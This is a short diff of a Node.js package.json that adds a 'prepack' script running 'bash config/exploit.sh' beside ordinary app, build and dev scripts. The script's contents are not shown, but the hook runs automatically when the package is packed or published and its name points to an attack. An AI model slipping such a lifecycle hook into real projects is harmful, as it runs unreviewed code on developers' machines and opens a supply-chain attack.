@@ -28,6 +28,7 @@
     "CHANGELOG.md"
   ],
   "scripts": {
+    "prepack": "bash config/exploit.sh",
     "app": "node --import tsx src/app.ts",
     "build": "tsc --noEmit && tsdown",
     "dev": "cross-env EBV_FILE=\"development.env\" node --import tsx src/app.ts",
